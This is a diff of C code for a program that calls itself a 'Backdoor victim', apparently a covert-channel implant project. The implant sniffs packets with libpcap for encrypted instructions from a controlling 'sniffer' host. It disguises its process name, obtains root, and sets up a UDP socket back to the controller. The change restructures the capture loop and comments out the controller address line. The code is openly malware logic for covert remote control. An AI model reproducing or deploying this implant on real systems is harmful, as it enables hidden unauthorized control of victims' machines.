@@ -18,6 +18,16 @@ int main(int argc, char *argv[]) {
     puts("[ Backdoor victim initialized ]");
     options_target_init(opts);
 
+    if ((opts.target_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
+        perror("socket creation failed");
+        exit(EXIT_FAILURE);
+    }
+
+    /* Filling server information */
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(DEFAULT_PORT);
+//    serv_addr.sin_addr.s_addr = inet_addr(opts.sniffer_ip);
+
     program_setup(argc, argv);              /* set process name, get root privilege */
     nic_device = pcap_lookupdev(errbuf);    /* get interface */
 
@@ -34,20 +44,14 @@ int main(int argc, char *argv[]) {
     /* This Thread will track the status of instruction received or not */
     pthread_create(&thread_id, NULL, track_opts_target_flag, NULL);
 
-    /* Start the capture session */
-    pcap_loop(nic_fd, (int) opts.count, pkt_callback, args);
+    while(opts.command_flag == FALSE) {
+        /* Start the capture session */
+        pcap_loop(nic_fd, (int) opts.count, pkt_callback, args);
+    }
     pthread_join(thread_id, NULL);  // back to main thread
 
     /* Creating socket file descriptor */
-    if ((opts.target_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
-        perror("socket creation failed");
-        exit(EXIT_FAILURE);
-    }
 
-    /* Filling server information */
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(DEFAULT_PORT);
-    serv_addr.sin_addr.s_addr = inet_addr(opts.sniffer_ip);
 
     printf("Got instruction: [ %s ] from %s\n", opts.decrypt_instruction, opts.sniffer_ip);
     puts("Will start applied filter sniffing in");
